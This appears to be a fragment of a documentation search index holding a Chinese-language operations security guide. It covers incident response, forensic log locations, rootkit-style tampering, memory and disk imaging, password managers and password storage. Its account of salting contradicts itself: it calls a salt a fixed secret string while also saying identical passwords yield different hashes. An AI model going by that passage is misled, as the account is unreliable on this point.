\u200b\u8fde\u63a5\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u8bf4\u660e\u200b\u5f88\u200b\u6709\u200b\u53ef\u80fd\u200b\u6709\u200b\u653b\u51fb\u8005\u200b\u5728\u5185\u200b\u7f51\u4e2d\u200b\u6d3b\u52a8\u200b\uff0c\u200b\u5728\u200b\u914d\u7f6e\u200b\u62a5\u8b66\u200b\uff08\u200b\u4f8b\u5982\u200b\u53d1\u9001\u200b\u90ae\u4ef6\u200b\uff09\u200b\u4e4b\u540e\u200b\uff0c\u200b\u7ba1\u7406\u5458\u200b\u5c31\u200b\u80fd\u591f\u200b\u53ca\u65f6\u53d1\u73b0\u200b\u5e76\u4e14\u200b\u54cd\u5e94\u200b\u3002</p>"},{"location":"ops/security/#incident-response","title":"\u5e94\u6025\u200b\u54cd\u5e94","text":"<p>\u200b\u5f53\u200b\u786e\u8ba4\u200b\u7cfb\u7edf\u200b\u88ab\u200b\u5165\u4fb5\u200b\u540e\u200b\uff0c\u200b\u9700\u8981\u200b\u5c3d\u5feb\u200b\u91c7\u53d6\u63aa\u65bd\u200b\uff0c\u200b\u907f\u514d\u200b\u8fdb\u4e00\u6b65\u200b\u635f\u5931\u200b\u3002\u200b\u4e00\u4e2a\u200b\u6781\u5176\u200b\u7b80\u5316\u200b\u540e\u200b\u7684\u200b\u57fa\u7840\u200b\u6d41\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u9694\u79bb\u200b\uff1a\u200b\u65ad\u5f00\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u3001\u200b\u5173\u95ed\u200b\u670d\u52a1\u200b\u7b49\u200b\uff0c\u200b\u907f\u514d\u200b\u653b\u51fb\u8005\u200b\u7ee7\u7eed\u200b\u64cd\u4f5c\u200b\u88ab\u200b\u653b\u51fb\u200b\u7684\u200b\u673a\u5668\u200b\u6216\u200b\u670d\u52a1\u200b\u3002</li> <li>\u200b\u5206\u6790\u200b\uff1a\u200b\u68c0\u67e5\u200b\u65e5\u5fd7\u200b\u3001\u200b\u76d1\u63a7\u200b\u6570\u636e\u200b\uff0c\u200b\u5206\u6790\u200b\u5165\u4fb5\u200b\u65b9\u5f0f\u200b\u3002</li> <li>\u200b\u4fee\u590d\u200b\uff1a\u200b\u4fee\u590d\u200b\u6f0f\u6d1e\u200b\u3001\u200b\u6e05\u9664\u200b\u6076\u610f\u4ee3\u7801\u200b\uff0c\u200b\u5bf9\u200b\u53d7\u5230\u200b\u5f71\u54cd\u200b\u7684\u200b\u7528\u6237\u200b\u91cd\u7f6e\u200b\u5bc6\u7801\u200b\u7b49\u200b\u3002</li> <li>\u200b\u603b\u7ed3\u200b\uff1a\u200b\u603b\u7ed3\u200b\u4e8b\u4ef6\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u7ecf\u9a8c\u6559\u8bad\u200b\uff0c\u200b\u907f\u514d\u200b\u672a\u6765\u200b\u53d1\u751f\u200b\u7c7b\u4f3c\u200b\u4e8b\u4ef6\u200b\u3002</li> </ol>"},{"location":"ops/security/#forensics-repair","title":"\u4e8b\u540e\u200b\uff1a\u200b\u6eaf\u6e90\u200b\u4e0e\u200b\u4fee\u590d","text":""},{"location":"ops/security/#forensics","title":"\u6eaf\u6e90","text":"<p>\u200b\u65e5\u5fd7\u200b\u4fe1\u606f\u200b\u5728\u200b\u6eaf\u6e90\u200b\u4e2d\u8d77\u200b\u7740\u200b\u81f3\u5173\u91cd\u8981\u200b\u7684\u200b\u4f5c\u7528\u200b\u3002\u200b\u5728\u200b\u5e38\u89c1\u200b\u7684\u200b\u5b89\u88c5\u200b\u4e86\u200b rsyslog \u200b\u7684\u200b Debian \u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u65e5\u5fd7\u200b\u4fe1\u606f\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li><code>~username/.bash_history</code>\uff1a\u200b\u7528\u6237\u200b\u7684\u200b Bash \u200b\u547d\u4ee4\u200b\u5386\u53f2\u8bb0\u5f55\u200b\u3002</li> <li><code>/var/log/wtmp</code>\uff1a\u200b\u767b\u5f55\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>last</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u3002</li> <li><code>/var/log/auth.log</code>\uff1a\u200b\u8ba4\u8bc1\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b SSH \u200b\u767b\u5f55\u200b\u3001sudo \u200b\u4f7f\u7528\u200b\u7b49\u200b\u3002</li> <li><code>/var/log/cron.log</code>\uff1acron \u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u7684\u200b\u6267\u884c\u200b\u4fe1\u606f\u200b\u3002</li> <li><code>/var/log/kern.log</code>\uff1a\u200b\u5185\u6838\u200b\u4fe1\u606f\u200b\uff1b\u200b\u5f53\u200b\u6b21\u200b\u542f\u52a8\u200b\u7684\u200b\u5185\u6838\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>dmesg</code> \u200b\u67e5\u770b\u200b\u3002</li> <li><code>/var/log/apt/</code>\uff1aAPT \u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002</li> <li><code>/var/log/syslog</code>\uff1a\u200b\u7cfb\u7edf\u65e5\u5fd7\u200b\u3002</li> </ul> <p>\u200b\u5176\u4ed6\u8f6f\u4ef6\u200b\uff08\u200b\u4f8b\u5982\u200b\u6570\u636e\u5e93\u200b\u3001Web \u200b\u670d\u52a1\u5668\u200b\u7b49\u200b\uff09\u200b\u4e5f\u200b\u4f1a\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff1bDocker \u200b\u5bb9\u5668\u200b\u5982\u679c\u200b\u672a\u200b\u88ab\u200b\u5220\u9664\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker logs</code> \u200b\u67e5\u770b\u200b\u5bb9\u5668\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002</p> <p>\u200b\u5728\u200b\u73b0\u4ee3\u200b\u7684\u200b\u57fa\u4e8e\u200b systemd \u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u65e5\u5fd7\u200b\u8bb0\u5f55\u200b\u5de5\u4f5c\u200b\u7531\u200b <code>systemd-journald</code> \u200b\u4e3b\u5bfc\u200b\uff0c\u200b\u5b58\u50a8\u200b\u4e3a\u200b\u4e8c\u8fdb\u5236\u200b\u683c\u5f0f\u200b\u3002\u200b\u5982\u679c\u200b\u7cfb\u7edf\u200b\u6ca1\u6709\u200b\u5b89\u88c5\u200b <code>syslog-ng</code> \u200b\u6216\u200b <code>rsyslog</code>\uff0c\u200b\u90a3\u4e48\u200b <code>/var/log</code> \u200b\u4e0b\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u4e0a\u8ff0\u200b\u7684\u200b\u7eaf\u200b\u6587\u672c\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>journalctl</code> \u200b\u5de5\u5177\u200b\u9605\u8bfb\u200b\u65e5\u5fd7\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u653b\u51fb\u8005\u200b\u62e5\u6709\u200b\u673a\u5668\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e9b\u200b\u65e5\u5fd7\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u5220\u9664\u200b\uff1b\u200b\u5982\u679c\u200b\u5165\u4fb5\u200b\u4e0e\u200b\u53d1\u73b0\u200b\u4e4b\u95f4\u200b\u8ddd\u79bb\u200b\u65f6\u95f4\u200b\u5f88\u957f\u200b\uff0c\u200b\u65e7\u200b\u7684\u200b\u65e5\u5fd7\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b rotate\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u9700\u8981\u200b\u5b9a\u65f6\u200b\u5907\u4efd\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u6216\u8005\u200b\u5229\u7528\u200b <code>rsyslog</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u5c06\u200b\u65e5\u5fd7\u200b\u5b9e\u65f6\u200b\u53d1\u9001\u5230\u200b\u5176\u4ed6\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u611f\u67d3\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6267\u884c\u200b\u7684\u200b\u547d\u4ee4\u200b\u8f93\u51fa\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u4e0d\u53ef\u200b\u4fe1\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b <code>/etc/ld.so.preload</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5728\u200b\u6240\u6709\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u7684\u200b\u7a0b\u5e8f\u6267\u884c\u200b\u4e4b\u524d\u200b\u52a0\u8f7d\u200b\u81ea\u5df1\u200b\u7684\u200b\u6076\u610f\u4ee3\u7801\u200b\uff0c\u200b\u6216\u662f\u200b\u76f4\u63a5\u200b\u5c06\u200b\u7cfb\u7edf\u200b\u7a0b\u5e8f\u200b\u66ff\u6362\u200b\u4e3a\u200b\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\u7248\u672c\u200b\uff1b\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u901a\u8fc7\u200b\u76f4\u63a5\u200b\u6ce8\u5165\u200b\u6076\u610f\u200b\u5185\u6838\u6a21\u5757\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5e72\u6270\u200b\u6240\u6709\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u8fd0\u884c\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u4fbf\u200b\u4f7f\u7528\u200b LiveCD \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u52a0\u8f7d\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u68c0\u67e5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u9759\u6001\u200b\u94fe\u63a5\u200b\u7684\u200b busybox \u200b\u5de5\u5177\u200b\u521d\u6b65\u200b\u6392\u67e5\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u6076\u610f\u200b\u7be1\u6539\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u4e00\u79cd\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u5224\u65ad\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u6587\u4ef6\u200b\u662f\u5426\u200b\u88ab\u200b\u4fee\u6539\u200b\u7684\u200b\u65b9\u5f0f\u200b\u662f\u200b\u4f7f\u7528\u200b <code>stat</code> \u200b\u6216\u200b <code>ls -lc</code>\uff08\u200b\u5efa\u8bae\u200b\u5728\u200b\u79bb\u7ebf\u200b\u73af\u5883\u200b\u4e2d\u200b\uff09\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u200b\u7684\u200b <code>Change</code> \u200b\u65f6\u95f4\u200b\u6233\u200b\u2014\u2014<code>Modify</code> \u200b\u65f6\u95f4\u200b\u6233\u200b\uff08mtime\uff09\u200b\u8868\u793a\u200b\u6587\u4ef6\u200b\u5185\u5bb9\u200b\u7684\u200b\u6700\u540e\u200b\u4fee\u6539\u200b\u65f6\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u4fee\u6539\u200b\uff0c\u200b\u800c\u200b <code>Change</code> \u200b\u65f6\u95f4\u200b\u6233\u200b\uff08ctime\uff09\u200b\u8868\u793a\u200b\u6587\u4ef6\u200b\u5143\u200b\u6570\u636e\u200b\uff08\u200b\u5305\u62ec\u200b mtime\uff09\u200b\u7684\u200b\u6700\u540e\u200b\u4fee\u6539\u200b\u65f6\u95f4\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u88ab\u200b\u968f\u610f\u200b\u4fee\u6539\u200b\u3002</p> <p>\u200b\u5728\u200b\u5fc5\u8981\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5de5\u5177\u200b dump \u200b\u7cfb\u7edf\u200b\u7684\u200b\u5185\u5b58\u200b\u955c\u50cf\u200b\u6216\u662f\u200b\u78c1\u76d8\u955c\u50cf\u200b\u5230\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u8fdb\u4e00\u6b65\u200b\u5206\u6790\u200b\u3002\u200b\u78c1\u76d8\u955c\u50cf\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>dd</code> \u200b\u5de5\u5177\u200b\u63d0\u53d6\u200b\uff0c\u200b\u800c\u200b\u5185\u5b58\u200b\u955c\u50cf\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b AVML \u200b\u6216\u8005\u200b LiME \u200b\u63d0\u53d6\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b Volatility \u200b\u5206\u6790\u200b\u3002</p>"},{"location":"ops/security/#repair","title":"\u4fee\u590d","text":"<p>\u200b\u5982\u679c\u200b\u786e\u8ba4\u200b\u653b\u51fb\u8005\u200b\u5df2\u7ecf\u200b\u83b7\u53d6\u200b\u4e86\u200b\u7cfb\u7edf\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u63a8\u8350\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u5728\u200b\u5907\u4efd\u200b\u6570\u636e\u200b\uff08\u200b\u6570\u636e\u200b\u672c\u8eab\u200b\u4e5f\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u53ef\u80fd\u200b\u88ab\u200b\u611f\u67d3\u200b\uff09\u200b\u4e4b\u540e\u200b\u76f4\u63a5\u200b\u91cd\u65b0\u5b89\u88c5\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6ca1\u6709\u200b\u975e\u5e38\u200b\u53ef\u9760\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6765\u200b\u786e\u8ba4\u200b\u7cfb\u7edf\u200b\u662f\u5426\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5b8c\u5168\u200b\u6e05\u7406\u200b\u3002\u200b\u540c\u65f6\u200b\u4e5f\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u653b\u51fb\u8005\u200b\u4f7f\u7528\u200b\u7684\u200b\u5165\u4fb5\u200b\u65b9\u5f0f\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u4fee\u590d\u200b\uff0c\u200b\u5426\u5219\u200b\u5373\u4f7f\u200b\u91cd\u65b0\u5b89\u88c5\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u76f8\u540c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u91cd\u65b0\u200b\u5165\u4fb5\u200b\u3002</p>"},{"location":"ops/security/#lessons","title":"\u6848\u4f8b\u200b\u4e0e\u200b\u5efa\u8bae","text":""},{"location":"ops/security/#password-advice","title":"\u5bc6\u7801\u200b\u76f8\u5173","text":""},{"location":"ops/security/#password-manager","title":"\u5bc6\u7801\u200b\u7ba1\u7406\u5668","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4eba\u7c7b\u200b\u6765\u8bb2\u200b\uff0c\u200b\u8bb0\u4f4f\u200b\u6570\u5341\u4e2a\u200b\u4e43\u81f3\u200b\u4e0a\u200b\u767e\u4e2a\u200b\u5bc6\u7801\u200b\u662f\u200b\u51e0\u4e4e\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bb8\u591a\u200b\u4eba\u200b\u8bbe\u7f6e\u200b\u5bc6\u7801\u200b\u7684\u200b\u4e60\u60ef\u200b\u662f\u200b\u5c06\u200b\u540c\u4e00\u4e2a\u200b\u5bc6\u7801\u200b\u6216\u8005\u200b\u5c0f\u5e45\u5ea6\u200b\u53d8\u5316\u200b\u7684\u200b\u53d8\u4f53\u200b\u7528\u200b\u5728\u200b\u6240\u6709\u200b\u9700\u8981\u200b\u6ce8\u518c\u200b\u7684\u200b\u7f51\u7ad9\u200b\u4ee5\u53ca\u200b\u7a0b\u5e8f\u200b\u4e0a\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u53ea\u8981\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7f51\u7ad9\u200b\u4f7f\u7528\u200b\u660e\u6587\u200b\u5b58\u50a8\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7f51\u7ad9\u200b\u6ca6\u9677\u200b\u4e4b\u540e\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u80fd\u591f\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u5bc6\u7801\u200b\u6765\u200b\u767b\u5f55\u200b\u5176\u4ed6\u200b\u7684\u200b\u7ad9\u70b9\u200b\u3002\u200b\u56e0\u6b64\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u662f\u200b\u5b89\u5168\u200b\u7ba1\u7406\u200b\u5bc6\u7801\u200b\u7684\u200b\u5fc5\u987b\u200b\u7a0b\u5e8f\u200b\u3002\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u8bb0\u5f55\u200b\u7f51\u7ad9\u200b\u4e0e\u200b\u5bc6\u7801\u200b\u7684\u200b\u5bf9\u5e94\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6709\u4e9b\u200b\u5305\u542b\u200b\u5176\u4ed6\u200b\u8bf8\u5982\u200b\u8bbe\u5907\u200b\u540c\u6b65\u200b\u3001\u200b\u5bc6\u7801\u200b\u81ea\u52a8\u200b\u751f\u6210\u200b\u3001\u200b\u5f3a\u5ea6\u200b\u68c0\u67e5\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u73b0\u4ee3\u200b\u6d4f\u89c8\u5668\u200b\u4e00\u822c\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5bc6\u7801\u200b\u8bb0\u5f55\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u529f\u80fd\u200b\u4e0a\u200b\u4e0d\u5982\u200b\u4e13\u7528\u200b\u7684\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u4e30\u5bcc\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4e0d\u4f1a\u200b\u52a0\u5bc6\u200b\u5bc6\u7801\u200b\u5b58\u50a8\u200b\uff0c\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u5e26\u6765\u200b\u4e86\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\u98ce\u9669\u200b\u3002</p> <p>\u200b\u4e3b\u6d41\u200b\u7684\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u65b9\u6848\u200b\u6709\u200b KeePass\uff08\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u3001\u200b\u672c\u5730\u200b\u5b58\u50a8\u200b\uff09\u3001Bitwarden\uff08\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u3001\u200b\u4e91\u7aef\u200b\u6216\u200b\u672c\u5730\u200b\u5b58\u50a8\u200b\uff09\u30011Password\uff08\u200b\u8ba2\u9605\u200b\u5236\u200b\u4ed8\u8d39\u200b\u3001\u200b\u4e91\u200b\u5b58\u50a8\u200b\uff09\u3001LastPass\uff08\u200b\u514d\u8d39\u200b\u6216\u200b\u8ba2\u9605\u200b\u5236\u200b\u4ed8\u8d39\u200b\u3001\u200b\u4e91\u200b\u5b58\u50a8\u200b\uff09\u200b\u7b49\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u9700\u8981\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u5728\u200b USTCLUG 2019 \u200b\u5e74\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u81ea\u7531\u200b\u65e5\u200b\u6d3b\u52a8\u200b\u4e2d\u200b\uff0c@SmartHypercube \u200b\u4ecb\u7ecd\u200b\u4e86\u200b KeePass\uff0c\u200b\u53ef\u200b\u9605\u8bfb\u200b slides \u200b\u4e86\u89e3\u200b\u66f4\u200b\u591a\u200b\u3002</p> <p>\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u65e0\u6cd5\u200b\u9632\u5fa1\u200b\u9488\u5bf9\u6027\u200b\u7684\u200b\u6076\u610f\u8f6f\u4ef6\u200b</p> <p>\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u5728\u200b\u8bbe\u8ba1\u200b\u65f6\u200b\u4e00\u822c\u200b\u4f1a\u200b\u8003\u8651\u200b\u5230\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5c1d\u8bd5\u200b\u5229\u7528\u200b\u5404\u79cd\u200b\u65b9\u5f0f\u200b\u4fdd\u8bc1\u200b\u5bc6\u7801\u200b\u6570\u636e\u5e93\u5b89\u5168\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u8ba1\u7b97\u673a\u200b\u88ab\u200b\u611f\u67d3\u200b\u4e86\u200b\u9488\u5bf9\u6027\u200b\u7684\u200b\u6076\u610f\u8f6f\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u4e00\u822c\u200b\u65e0\u6cd5\u200b\u6709\u6548\u200b\u9632\u5fa1\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff1a\u200b\u4f8b\u5982\u200b\uff0c\u200b\u6076\u610f\u8f6f\u4ef6\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u81ea\u5df1\u200b\u66ff\u6362\u200b\u6389\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4ee5\u200b\u83b7\u53d6\u200b\u4e3b\u200b\u5bc6\u7801\u200b\u89e3\u5bc6\u200b\u6570\u636e\u5e93\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b LastPass</p> <p>\u200b\u7531\u4e8e\u200b LastPass \u200b\u5df2\u7ecf\u200b\u591a\u6b21\u200b\u51fa\u73b0\u200b\u5b89\u5168\u4e8b\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8c28\u614e\u200b\u4f7f\u7528\u200b\u3002\u200b\u5982\u679c\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b LastPass\uff0c\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u52a0\u5bc6\u200b\u8fed\u4ee3\u200b\u6b21\u6570\u200b\u8db3\u591f\u200b\u5927\u200b\uff08\u200b\u4f8b\u5982\u200b 600000 \u200b\u6b21\u200b\uff09\u3002\u200b\u8f83\u200b\u65e9\u200b\u6ce8\u518c\u200b\u7684\u200b\u7528\u6237\u200b\u7684\u200b\u8fed\u4ee3\u200b\u6b21\u6570\u200b\u53ef\u80fd\u200b\u53ea\u6709\u200b 5000 \u200b\u751a\u81f3\u200b 500\u3002</p>"},{"location":"ops/security/#password-storage-and-policy","title":"\u5bc6\u7801\u200b\u5b58\u50a8\u200b\u4e0e\u200b\u5bc6\u7801\u200b\u7b56\u7565","text":"<p>\u200b\u4e0a\u6587\u200b\u63d0\u5230\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u7f51\u7ad9\u200b\u4f7f\u7528\u200b\u660e\u6587\u200b\u5b58\u50a8\u200b\u5bc6\u7801\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u65e6\u200b\u6570\u636e\u5e93\u200b\u6cc4\u6f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u80fd\u200b\u5229\u7528\u200b\u660e\u6587\u200b\u5bc6\u7801\u200b\u5728\u200b\u5176\u4ed6\u200b\u7684\u200b\u5e73\u53f0\u200b\u4e0a\u200b\u5c1d\u8bd5\u200b\u3002\u200b\u56e0\u6b64\u200b\u5b58\u50a8\u200b\u5bc6\u7801\u200b\u9700\u8981\u200b\u52a0\u76d0\u200b\u54c8\u5e0c\u200b\u5b58\u50a8\u200b\uff0c\u200b\u76d0\u200b\uff08salt\uff09\u200b\u662f\u200b\u4e00\u4e32\u200b\u8db3\u591f\u200b\u957f\u200b\u7684\u200b\u56fa\u5b9a\u200b\u7684\u200b\u79c1\u5bc6\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\uff0c\u200b\u4e0e\u200b\u5bc6\u7801\u200b\u62fc\u63a5\u200b\u4e4b\u540e\u200b\u54c8\u5e0c\u200b\u5f97\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u624d\u200b\u53ef\u4ee5\u200b\u6301\u4e45\u200b\u5316\u200b\u5b58\u50a8\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\u4e0d\u540c\u200b\u7528\u6237\u200b\u5982\u679c\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u76f8\u540c\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u6700\u540e\u200b\u5b58\u50a8\u200b\u7684\u200b\u54c8\u5e0c\u200b\u4e5f\u200b\u5e94\u5f53\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u52a0\u76d0\u200b\u54c8\u5e0c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f7f\u7528\u200b\u5f69\u8679\u200b\u8868\u200b\uff08Rainbow table\uff09\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u8f7b\u677e\u200b\u5730\u200b\u53cd\u63a8\u200b\u660e\u6587\u200b\u5bc6\u7801\u200b\u3002</p> <p>Have I Been Pwned?</p> <p>Have I Been Pwned \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u68c0\u67e5\u200b\u5bc6\u7801\u200b\u662f\u5426\u200b\u66fe\u200b\u88ab\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u5f53\u7136\u200b\uff0c\u200b\u628a\u200b\u81ea\u5df1\u200b\u7684\u200b\u5bc6\u7801\u200b\u968f\u4fbf\u200b\u8f93\u5165\u200b\u5230\u200b\u4e71\u4e03\u516b\u7cdf\u200b\u7684\u200b\u7f51\u7ad9\u200b\u91cc\u9762\u200b\u7edd\u5bf9\u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u597d\u200b\u4e3b\u610f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8be5\u7ad9\u200b\u89e3\u91ca\u200b\u4e86\u200b\u81ea\u5df1\u200b\u5982\u4f55\u200b\u4fdd\u969c\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u5bc6\u7801\u200b\u67e5\u8be2\u200b\u4e0d\u200b\u5305\u542b\u200b\u660e\u6587\u200b\u5bc6\u7801\u200b\u4fe1\u606f\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5728\u200b\u8f93\u5165\u200b\u5bc6\u7801\u200b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u4ed6\u4eec\u200b\u662f\u5426\u200b\u771f\u7684\u200b\u8fd9\u4e48\u200b\u5b9e\u73b0\u200b\u4e86\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u8981\u200b\u4fe1\u670d\u200b\u8fd9\u4e2a\u200b\u533f\u540d\u200b\u7b97\u6cd5\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\u3002</p> 